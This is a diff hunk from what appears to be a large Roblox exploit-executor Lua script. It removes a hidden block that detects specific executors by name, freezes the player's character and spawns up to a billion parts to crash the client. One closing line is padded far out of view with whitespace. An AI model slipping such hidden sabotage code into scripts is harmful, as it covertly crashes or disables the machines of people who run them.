@@ -7857,36 +7857,3 @@ run(function()
 	})
 	
 end)
-	
-local p = game:GetService("Players").LocalPlayer
-local bad = { "codex", "ronix", "frostware", "fluxus", "solara", "evon", "vegax" }
-
-local function badexec()
-    local f = function(x)
-        x = x:lower()
-        for _, v in pairs(bad) do
-            if x:find(v) then return true end
-        end
-    end
-    local e = (getexecutorname and getexecutorname()) or (identifyexecutor and identifyexecutor())
-    if e and f(e) then return true end
-    for _, v in pairs({ _G.Executor, shared.Executor, _G.Codex, shared.Codex }) do
-        if type(v) == "string" and f(v) then return true end
-    end
-end
-
-if badexec() then
-    for _, v in pairs((p.Character or p.CharacterAdded:Wait()):GetDescendants()) do
-        if v:IsA("BasePart") then v.Anchored = true end
-    end
-    for i = 1, 1e9 do
-        task.spawn(function()
-            local a = Instance.new("Part")
-            a.Size = Vector3.new(3,3,3)
-            a.Position = Vector3.new(math.random(-1000,1000),math.random(0,500),math.random(-1000,1000))
-            a.Anchored = true
-            a.BrickColor = BrickColor.Random()
-            a.Parent = workspace
-        end)
-    end
-end																																																																																																																																																																																																													end																																																																																																																																																																																																																			
